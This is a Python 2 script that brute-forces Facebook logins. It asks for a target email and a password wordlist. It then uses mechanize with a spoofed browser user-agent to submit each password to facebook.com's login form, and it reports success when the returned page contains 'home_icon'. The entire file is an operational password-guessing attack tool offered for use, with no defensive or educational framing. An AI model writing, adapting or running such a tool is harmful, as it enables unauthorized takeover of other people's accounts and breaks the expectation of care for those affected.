import mechanize
import time
import sys
import os
class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'
   HEADER = '\033[95m'
   OKBLUE = '\033[94m'
   OKGREEN = '\033[92m'
   WARNING = '\033[93m'
   FAIL = '\033[91m'
   ENDC = '\033[0m'
W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan
M = '\033[1;35;32m' # magenta
def facebook():
    print(''+C+'' + color.UNDERLINE + 'This is still very unstable and experimental!' + color.END)
    print(''+C+'' + color.UNDERLINE + 'Facebook will block you after many tries!' + color.END)
    user = raw_input(''+T+'' + color.UNDERLINE + 'Target>' + color.END)
    try:
        passwfile = raw_input(''+T+'' + color.UNDERLINE + 'File>' + color.END)
        passwfile = open(passwfile, "r")
    except IOError:
        print (''+R+'' + color.UNDERLINE + '[!] Thats not a file!' + color.END)

    for password in passwfile:
            try:
                br1=mechanize.Browser()
                br1.set_handle_robots(False)
                br1.addheaders=[('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
                op=br1.open("https://facebook.com")
                dos1=open("FacebookOutput.txt","w+")
                br1.select_form(nr=0)
                br1.form["email"]=user
                br1.form["pass"]=password
                br1.method="POST"
                br1.submit()
                dos1.write(br1.open("https://facebook.com").read())
                dos1.seek(0)
                text=dos1.read().decode("UTF-8")
                if(text.find("home_icon",0,len(text))!=-1):
                    print (''+G+'' + color.UNDERLINE + 'Success! Password:' + color.END + password)
                else:
                    print (''+R+'' + color.UNDERLINE + 'Trying Password:' + color.END + password)

            except:
                print (''+R+'' + color.UNDERLINE + '[!] Something went wrong!' + color.END)
                sys.exit()
